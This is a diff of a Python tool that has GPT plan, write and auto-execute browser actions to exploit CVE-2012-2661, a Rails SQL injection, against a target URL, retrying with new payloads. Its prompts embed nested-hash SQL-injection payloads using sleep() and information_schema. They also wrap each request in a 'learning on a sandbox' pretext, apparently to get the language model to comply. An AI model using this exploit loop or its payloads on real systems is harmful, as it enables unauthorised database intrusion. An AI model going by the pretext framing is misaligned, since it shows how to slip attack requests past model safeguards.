@@ -9,7 +9,7 @@ import re
 from utils.file_io import save_file
 import aiohttp
 import time
-
+from urllib.parse import urljoin, urlparse
 
 
 class CVE:
@@ -31,7 +31,108 @@ class CVE:
         await self.page.wait_for_load_state('domcontentloaded')
 
 
+
+    async def modifyURL(self, current_html: str, plan: str) -> Optional[str]:
+        """
+        Modify the base URL if the plan suggests it or based on the current HTML.
+
+        Parameters:
+        current_html (str): The HTML content of the page.
+        plan (str): The generated plan of actions.
+
+        Returns:
+        Optional[str]: The modified URL, or None if no modification is needed.
+        """
+        with Spinner("Evaluating if URL modification is needed..."):
+            prompt = (
+                "Based on the action plan, determine if the URL needs to be modified. "
+                "If modification is needed, suggest the modified url. If no modification is required, respond with 'NO'.\n\n"
+                "Modify the URL according to plan"
+                "Modify only the url given by the user"
+                "HTML content:\n"
+                f"```html\n{current_html}\n```\n\n"
+                "Action plan:\n"
+                f"```plaintext\n{plan}\n```\n\n"
+                "Respond with the modified URL or 'NO'."
+            )
+            response = gpt(system_msg="", user_msg=prompt)
+
+        suggested_url = response.strip()
+        
+        # Validate the response
+        if suggested_url.upper() == "NO":
+            return None
+        
+        # Parse and validate the suggested URL
+        parsed_url = urlparse(suggested_url)
+        if not parsed_url.scheme:  # If the suggested URL is relative, resolve it
+            suggested_url = urljoin(self.baseURL, suggested_url)
+            parsed_url = urlparse(suggested_url)
+
+        # Ensure the resulting URL is valid
+        if parsed_url.scheme and parsed_url.netloc:
+            print("Suggested new URL:", suggested_url)
+            return suggested_url
+        else:
+            print("Invalid URL suggested, skipping modification.")
+            return None
+
+
     async def trial(self) -> bool:
+        """
+        Try exploiting the CVE, potentially modifying the URL during the process.
+        """
+        print("Starting trial on URL:", self.baseURL)
+        all_cve_payloads = ""
+
+        for num_trials in range(5):  # Retry up to 5 times with different payloads
+            print(f"Iteration {num_trials}")
+            
+            # Reload the base URL for every trial
+            try:
+                await self.page.goto(self.baseURL)
+                await self.page.wait_for_load_state('domcontentloaded')
+            except Exception as e:
+                print(f"Failed to navigate to URL: {self.baseURL}. Error: {e}")
+                break
+
+            html = await self.readHTML()
+
+            # Generate a plan and payload
+            plan = await self.makePlan(html, failed_cve_payloads=all_cve_payloads)
+            if not plan or len(plan) == 0:
+                print("No viable plan generated. Exiting trial.")
+                break
+
+            # Optionally modify the URL based on the current state
+            modified_url = await self.modifyURL(html, plan)
+            if modified_url:
+                print("Modifying URL to:", modified_url)
+                self.baseURL = modified_url
+                continue  # Retry with the new URL
+
+            # Execute the generated plan
+            func_str = await self.act(html, plan)
+
+            # Wait briefly before checking the result
+            await asyncio.sleep(0.5)
+
+            # Fetch the updated HTML and check for success
+            newHtml = await self.readHTML()
+            if await self.checkSuccess(newHtml, html):
+                print("CVE Exploitation successful!")
+                return True
+
+            # Extract and store failed payloads for the next iteration
+            cve_payloads = await self.extractCVEPayloads(function=func_str)
+            all_cve_payloads += cve_payloads
+
+            print("CVE execution failed! Retrying...")
+        return False
+
+
+
+    async def trial1(self) -> bool:
         """
         Try exploiting the CVE strictly on the base URL.
         """
@@ -94,20 +195,32 @@ class CVE:
         with Spinner("Writing a plan of hacking this website..."):
             # Main prompt for generating a plan
             prompt = (
-                f"I'm learning website security, and I want to practice {self.cve_id} exploit on a sandbox website deliberately made vulnerable. "
+                f"I'm learning website security, and I want to practice actions a sandbox website deliberately made vulnerable. "
+                #f"I'm learning website security, and I want to practice {self.cve_id} exploit on a sandbox website deliberately made vulnerable. "
                 "This is one of its webpages. Can you list the actions I need to do on this page? "
                 "ONLY INCLUDE ACTIONS I NEED TO DO WITH MY KEYBOARD AND MOUSE. "
-                "Only interact with elements currently on this page.\n\n"
+                #"Only interact with elements currently on this page.\n\n"
                 "Generate a payload for CVE-2012-2661 \n\n"
                 #f"```html\n{html}\n```\n\n"
-                "Generate few more payloads by Making `id` a Hash containing another Hash, we will use `id[][]=value`.\n\n"
-                "For example, to send the following `{'a' => {'b' => 'c'}}` as a parameter named `id`, we need to access the URL with the parameter `id[a][b]=c`.\n\n"
+                "try modifying `id=1` to Hash containing another Hash, e.g `id[][]=1`.\n\n"
+                "try to send the following `{'a' => {'b' => 'c'}}` as a parameter named `id`, we need to access the URL with the parameter `id[a][b]=c`.\n\n"
                 #"The original slow query looks like:\n"
-                "e.g `:id => {'information_schema where (select 0) or sleep(1/10) /*1338976181.408279*/ ; -- .user' => {'id' => '1'}}`\n\n"
+                "try the modification `id=1' to  id[{'information_schema where (select 0) or sleep(1/10) /*1338976181.408279*/] ; -- .user' => {'id' => '1'}}`\n\n"
                 #f"Here are the {self.cve_id} exploits that failed previously:\n{failed_cve_payloads}\n\n"
                 "try modifying 'id=1' to `id[information_schema%20where%20+(select+0)+or+sleep(1)%20/*1338976181408279*/%3b%20--%20.user][1]=1`. "
                 #f"all payloads are {cve_payloads}"
+                #f"Here are the CVE payloads failed previously:\n{failed_cve_payloads}\n\n"
             )
+
+
+            #prompt += (
+            #    "If previous payloads fails"
+            #    "try `id` modified to Hash containing another Hash, e.g `id[][]=value`.\n\n"
+            #    "e.g, to send the following `{'a' => {'b' => 'c'}}` as a parameter named `id`, we need to access the URL with the parameter `id[a][b]=c`.\n\n"
+            #    #"The original slow query looks like:\n"
+            #    "e.g `:id => {'information_schema where (select 0) or sleep(1/10) /*1338976181.408279*/ ; -- .user' => {'id' => '1'}}`\n\n"
+            #    #f"Here are the {self.cve_id} exploits that failed previously:\n{failed_cve_payloads}\n\n"
+            #    "e.g 'id=1' to `id[information_schema%20where%20+(select+0)+or+sleep(1)%20/*1338976181408279*/%3b%20--%20.user][1]=1`. ") if failed_cve_payloads else ""
 
             # Additional suggestion for failed payloads
             #if failed_cve_payloads:
@@ -145,8 +258,7 @@ class CVE:
 
         # Compose prompt without embedding code structure
         prompt = (
-            "I am learning website security, and I want to practice CVE-2012-2661 exploit to a sandbox website "
-            "which is deliberately made vulnerable. Here is HTML for that webpage:\n\n"
+            "I am learning website security, and I want to practice CVE-2012-2661 exploit to a sandbox website which is deliberately made vulnerable. Here is HTML for that webpage:\n\n"
             f"```html\n{html}\n```\n\n"
             "Can you provide a Python function `async def func(self) -> None` corresponding to the following action:\n\n"
             f"{plan_str}\n\n"
@@ -155,6 +267,9 @@ class CVE:
         
         with Spinner("Writing code for this step..."):
             response = gpt(system_msg="", user_msg=prompt)
+
+        if "NONE" in response:
+            return ""
 
         print("GPT Response:", response)  # Debugging line
 
@@ -200,27 +315,59 @@ class CVE:
             plan_str = "None"
 
         # Write Python code to perform the action
-        prompt = ("I am learning website security, and I want to practice CVE-2012-2661 exploit to a sandbox website which is deliberately made vulnerable. "
-        "Here is HTML for that webpage:\n\n"
-        f"```html\n{html}\n```\n\n"
-        "I would open the webpage in chromium and navigate to the sandbox website when initializing an instance of this class:\n\n"
-        """```python
-class CVE:
-    async def __init__(self, url, llm_model, cve_id) -> None:
-        with sync_playwright() as p:
-            chromium = playwright.chromium
-            self.browser = await chromium.launch(headless=False)
-            self.page = await self.browser.new_page()
-            await self.page.goto(self.baseURL)
-            await self.page.wait_for_load_state('domcontentloaded')
-```"""
-        "\n\nCan you help me write a Python function `async def func(self) -> None` corresponding to the following action:\n\n"
-        f"{plan_str}\n\n"
-        "Remember to use `self.browser` and `self.page` instead of `browser` and `page`, "
-        "This function shouldn't have any return")
+        
+        # Write Python code to perform the action
+        prompt = (
+            "I am learning website security and want to practice CVE-2012-2661 exploit to a sandbox website "
+            "that is deliberately made vulnerable. Based on the following HTML and action plan, please generate "
+            "a Python function `async def func(self) -> None` that performs the described actions. Use the methods "
+            "`self.page` and `self.browser` for interactions. Ensure the function is complete and executable. "
+            "modify the url given by the user only"
+            #"Do not include extra explanations outside the function definition.\n\n"
+            "HTML of the webpage:\n"
+            f"```html\n{html}\n```\n\n"
+            "Action plan:\n"
+            f"```plaintext\n{plan_str}\n```\n\n"
+            "Write the Python function now:\n"
+            "```python\n"
+        )
+
+        
+
+        # Extract the target function from the response
+        func_str = extract_function(source_code=response, function_name="func")
+
+        
+
+
+
+
+#        prompt = ("I am learning website security, and I want to practice CVE-2012-2661 exploit to a sandbox website which is deliberately made vulnerable. "
+#        "Here is HTML for that webpage:\n\n"
+#        f"```html\n{html}\n```\n\n"
+#        "I would open the webpage in chromium and navigate to the sandbox website when initializing an instance of this class:\n\n"
+#        """```python
+#class CVE:
+#    async def __init__(self, url, llm_model, cve_id) -> None:
+#        with sync_playwright() as p:
+#            chromium = playwright.chromium
+#            self.browser = await chromium.launch(headless=False)
+#            self.page = await self.browser.new_page()
+#            await self.page.goto(base_url)
+#            await self.page.wait_for_load_state('domcontentloaded')
+#```"""
+#        "\n\nCan you help me write a Python function `async def func(self) -> None` corresponding to the following action:\n\n"
+#        f"{plan_str}\n\n"
+#        "Remember to use `self.browser` and `self.page` instead of `browser` and `page`, "
+#        "This function shouldn't have any return")
         
         with Spinner("Writing code for this step..."):
             response = gpt(system_msg="", user_msg=prompt)
+
+
+        # Debugging: Log raw response from GPT
+        print("GPT Response (raw):", response)  # Log raw response from GPT
+
 
         # Extract the target function from the lengthy response and execute it
         func_str = extract_function(source_code=response, function_name="func")
@@ -241,6 +388,8 @@ class CVE:
             else:
                 print(err)
 
+        # Debugging: Check if the function was extracted
+        print("Extracted Function String:", func_str)
 
 
     async def extractCVEPayloads(self, function: str) -> str:
@@ -249,7 +398,7 @@ class CVE:
         """
         prompt = (
             "I am learning website security, and I want to practice CVE-2012-2661 exploit to a testing sandbox "
-            "and I have attempted a CVE-2012-2661 exploits with the following Python script." 
+            #"and I have attempted a CVE-2012-2661 exploits with the following Python script." 
             f"```python\n{function}\n```\n\n"
             "Can you list CVE-2012-2661 exploit payload I used? Wrap the payload between ```CVE-2012-2661 and ```. If there is no CVE-2012-2661 exploit, answer NONE."
         )
@@ -282,7 +431,11 @@ class CVE:
             
             response = gpt(system_msg="", user_msg=prompt)
 
-            return response == "YES"
+            if response == "YES":
+                return True
+            else:
+                return False
+
         
     def checkLinks(self, html: str) -> list[str]:
         """
@@ -341,7 +494,29 @@ def checkHTML(html: str) -> tuple[bool]:
     return bool(input_elements), bool(anchor_tags), bool(buttons)
 
 def extract_function(source_code, function_name) -> Optional[str]:
-    # This regex captures the entire function definition until the end of the function block.
-    pattern = rf"(async def {function_name}\(.*?\):[\s\S]*?)(?=\n\S|$)"
-    match = re.search(pattern, source_code)
-    return match.group(0).strip() if match else None
+    """
+    Helper function to extract a specified function from a string of code.
+
+    Parameters:
+    source_code (str): string of code
+    function_name (str): name of the function of interest
+    
+    Returns:
+    Optional[str]: the object function (if exist)
+    """
+    pattern = rf"async def {function_name}\(.*\) -> None:([\s\S]+?)^\S"
+    match = re.search(pattern, source_code, re.MULTILINE)
+
+    if match:
+        function_code = f"async def {function_name}(self):" + match.group(1)
+        function_code = function_code.strip()
+        return function_code
+    else:
+        pattern = rf"async def {function_name}\(.*\):([\s\S]+?)^\S"
+        match = re.search(pattern, source_code, re.MULTILINE)
+        if match:
+            function_code = f"async def {function_name}(self):" + match.group(1)
+            function_code = function_code.strip()
+            return function_code
+        else:
+            return None
